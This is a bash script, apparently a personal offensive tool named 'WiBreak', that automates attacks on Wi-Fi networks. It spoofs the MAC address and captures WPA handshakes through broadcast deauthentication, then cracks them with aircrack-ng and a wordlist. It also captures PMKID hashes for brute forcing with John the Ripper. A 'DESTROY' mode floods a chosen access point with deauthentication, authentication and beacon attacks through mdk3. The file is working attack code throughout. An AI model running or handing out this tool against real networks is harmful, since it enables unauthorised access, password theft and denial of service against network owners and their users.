#!/bin/bash

#Colors
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

function ctrl_c(){
	echo -e "\n${red}[!] Exiting${end}"
	tput cnorm; airmon-ng stop ${card} > /dev/null 2>&1
	rm $e* 2>/dev/null
	exit 0
}

trap ctrl_c INT

function banner(){
	echo -e "\n${green} ____ ____ ____ ____ ____ ____ ____ \t\t      ${gray}BY${end} ${purple}Invertebrado${end}\n${green}||${gray}W ${green}|||${gray}i ${green}|||${gray}B ${green}|||${gray}r ${green}|||${gray}e ${green}|||${gray}a ${green}|||${gray}k ${green}||\n||__|||__|||__|||__|||__|||__|||__||\t${gray}PERSONAL PAGE ${yellow}https://invertebr4do.github.io${end}\n${green}|/__\|/__\|/__\|/__\|/__\|/__\|/__\|\t   ${gray}GITHUB ${turquoise}https://github.com/Invertebr4do${end}\n"
	for i in $(seq 1 85); do echo -ne ${blue}―${end}; done
}

function helpPanel(){
	echo -e "\n${red}[!] Use: $0"
	for i in $(seq 1 80); do echo -ne ${red}―${end}; done
	echo -e "\n\n\t${blue}┃${end}  ${purple}[-a]${end} ${yellow}Attack Mode${end}"
	echo -e "\t\t${turquoise}handshake${end}"
	echo -e "\t\t${turquoise}PKMID${end}"
	echo -e "\t\t${turquoise}ALL${end}"
	echo -e "\t\t${red}DESTROY${end}"
	echo -e "\t${blue}┃${end}  ${purple}[-i]${end}${yellow} Interface in monitor mode${end}"
	echo -e "\t${blue}┃${end}  ${purple}[-m]${end}${yellow} MAC address${end}"
	echo -e "\t${blue}┃${end}  ${purple}[-t]${end}${yellow} Timeout${end}"
	echo -e "\t${blue}┃${end}  ${purple}[-l]${end}${yellow} List red interfaces${end}"
	echo -e "\t${blue}┃${end}  ${purple}[-h]${end}${yellow} Show this help panel${end}"
	echo -e "\n\t${purple}Use examples:${end}\n"
	echo -e "\t\t${green}$0${end} ${turquoise}-l${end}"
	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}handshake${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}handshake${end} ${turquoise}-m${end} ${gray}fc:e5:57:fc:ad:b4${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}PKMID${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}ALL${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}DESTROY${end} ${turquoise}-i${end} ${gray}wlan0mon${end} ${turquoise}-t${end} ${gray}40${end}"
}

function config(){
	clear; tput civis
	banner; echo -e "\n${yellow}[*]${end}${gray} Configuring your network card...${end}\n"

	IM=$(iwconfig wlan0 | grep "Mode" | awk '{print $2}' FS=":" | awk 'NR{print $NR}')

	if [ "$(echo $IM)" != "Monitor" ]; then
		airmon-ng start ${card} > /dev/null 2>&1
		killall dhclient wpa_supplicant 2>/dev/null
	fi

	ifconfig ${card} down && macchanger --mac=$mac ${card} > /dev/null 2>&1
	ifconfig ${card} up

	echo -e "${yellow}[*]${end}${gray} New MAC address ${end}${purple}[${end}${blue}$(macchanger -s ${card} | grep -i current | xargs | cut -d ' ' -f '3-100')${end}${purple}]${end}"; sleep 3; tput cnorm
}

function listInterfaces(){
	interfaces=$(ifconfig | awk '{print $1}' | grep ":" | awk '{print $1}' | tr -d ':')
	echo -e "\n${purple}[*]${gray} Listing red interfaces${end}\n"

	for i in $interfaces; do
		echo -e "${turquoise}[${green}+${turquoise}]${end} ${yellow}$i${end}\n"
	done
}

function handshake(){
	clear; tput civis
	banner

	declare -a dependencies=(xterm aircrack-ng macchanger)

        echo -e "\n${yellow}[*]${end} ${gray}Checking necessary programs${end}"; sleep 2

        for program in "${dependencies[@]}"; do
                echo -ne "\n${yellow}[*]${end}${blue} Tool${end}${purple} $program${end}${blue}...${end}"

                which $program > /dev/null 2>&1

                if [ "$(echo $?)" == "0" ]; then
                        echo -e " ${green}[✓]${end}"
                else
                        echo -e " ${red}[X]${end}\n"
                        echo -e "${yellow}[*]${end}${gray} Installing ${end}${blue}$program${end}${yellow}...${end}"
                        apt-get install $program -y > /dev/null 2>&1
                fi; sleep 0.3
        done; clear; banner

	xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "airodump-ng ${card}" &
	airodump=$!

	echo -ne "\n${yellow}[*]${end}${gray} AP ESSID: ${end}"; read e
	echo -ne "\n${yellow}[*]${end}${gray} AP CHANNEL: ${end}"; read c

	kill -9 $airodump
	wait $airodump 2>/dev/null

	xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "airodump-ng -c $c -w $e --essid $e ${card}" &
	airodumpF=$!

	sleep 5; xterm -hold -T "AIREPLAY-NG" -geometry 90x15 -e "aireplay-ng -0 10 -e $e -c FF:FF:FF:FF:FF:FF ${card}" &
	aireplay=$!
	sleep 10; kill -9 $aireplay; wait $aireplay 2>/dev/null

	sleep 15; kill -9 $airodumpF
	wait $airodumpF 2>/dev/null

	echo -e "\n${green}[+]${end}${gray} Cracking ${green}$e${end} ${gray}password...${end}\n"; sleep 0.5
	xterm -hold -T "AIRCRACK-NG" -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt $e*.cap" &
	tput cnorm
}

function PKMID(){
	clear; tput civis
	banner

	declare -a dependencies=(xterm hcxdumptool hcxpcaptool john)

        echo -e "\n${yellow}[*]${end}${gray} Checking necessary programs${end}"; sleep 2

        for program in "${dependencies[@]}"; do
                echo -ne "\n${yellow}[*]${end}${blue} Tool${end}${purple} $program${end}${blue}...${end}"

                which $program > /dev/null 2>&1

                if [ "$(echo $?)" == "0" ]; then
                        echo -e " ${green}[✓]${end}"
                else
                        echo -e " ${red}[X]${end}\n"
                        echo -e "${yellow}[*]${end}${gray} Installing ${end}${blue}$program${end}${yellow}...${end}"
                        apt-get install $program -y > /dev/null 2>&1
                fi; sleep 0.3
        done; clear

	banner; echo -e "\n${yellow}[*]${end}${gray} Starting ClientLess PKMID Attack${end}"; sleep 2

	xterm -T "HCXDUMPTOOL" -geometry 105x40 -e "timeout 60 bash -c \"hcxdumptool -i ${card} -o Capture --enable_status=1\""

	echo -e "\n\n${yellow}[*]${end}${gray} Obtaining Hashes...${end}\n"; sleep 2
	xterm -T "HCXPCAPTOOL" -geometry 105x40 -e "hcxpcaptool -z Hashes Capture"; rm Capture 2>/dev/null

	test -f Hashes

	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n${green}[+]${end}${gray} Brute forcing hashes...${end}\n"; sleep 2

		xterm -hold -T "JOHN" -geometry 100x20 -e "john --wordlist=/usr/share/wordlists/rockyou.txt Hashes" &
	else
		echo -e "\n${red}[!] A problem was ocurred capturing the packages${end}\n"
		rm Capture* 2>/dev/null
		sleep 2
	fi; tput cnorm
}

function destroy(){
	clear; tput civis
	banner

	echo -e "\n\t  ${red}█ INITIALIZING! █${end}"

	xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "airodump-ng ${card}" &
	airodump=$!

	echo -ne "\n${red}[*]${end}${gray} AP ESSID: ${end}"; read e
        echo -ne "\n${red}[*]${end}${gray} AP BSSID: ${end}"; read b
	echo -ne "\n${red}[*]${end}${gray} AP CHANNEL: ${end}"; read c

	kill -9 $airodump
	wait $airodump 2>/dev/null

	echo -e "\n\n\t${red}████ LETS GOOOO! ████${end}"

	xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "timeout $time_out bash -c \"airodump-ng -c $c --essid $e ${card}\"" &

	sleep 3; xterm -T "AIREPLAY-DEAUTHENTICATING" -geometry 100x25 -e "timeout $time_out bash -c \"aireplay-ng -0 0 -e $e -c FF:FF:FF:FF:FF:FF ${card}\"" &
	sleep 3; xterm -T "MDK3-AUTHENTICATING" -geometry 70x30 -e "timeout $time_out bash -c \"mdk3 ${card} a -a $b\"" &
	sleep 3; xterm -T "MDK3-DEAUTHENTICATING" -geometry 60x20 -e "timeout $time_out bash -c \"mdk3 ${card} d -a $b\"" &
	sleep 3; xterm -T "MDK3-NETWOR_SPECTRUM" -geometry 60x20 -e "timeout $time_out bash -c \"mdk3 ${card} b -a -s 1000 -c $c\"" &

	tput cnorm
}

#══════════════┃ MAIN ┃═════════════

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:i:m:t:l:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1;;
			i) card=$OPTARG; let parameter_counter+=1;;
			m) mac=$OPTARG; let parameter_counter+=1;;
			t) time_out=$OPTARG; let parameter_counter+=1;;
			l) listInterfaces;;
			h) helpPanel;;
		esac
	done

	if [[ $parameter_counter < 2 && "$(echo $1)" != "-l" || $parameter_counter > 3 ]]; then
		helpPanel
	else
		if [ "$(echo $1)" == "-l" ]; then
			listInterfaces
		fi
		if [ ! $mac ]; then
			mac="00:20:91:da:af:91"
		fi
		if [ "$(echo $attack_mode)" == "handshake" ]; then
			config; handshake
		elif [ "$(echo $attack_mode)" == "PKMID" ]; then
			config; PKMID
		elif [ "$(echo $attack_mode)" == "ALL" ]; then
			config; handshake; PKMID
		elif [ "$(echo $attack_mode)" == "DESTROY" ]; then
			if [ ! $time_out ]; then
				declare -i time_out=60
				config; destroy
			else
				config; destroy
			fi
		fi
		tput cnorm; airmon-ng stop ${card} > /dev/null 2>&1
	fi
else
	echo -e "\n${red}█ You have to be root${end}\n"
fi

#══════════════════════════════════
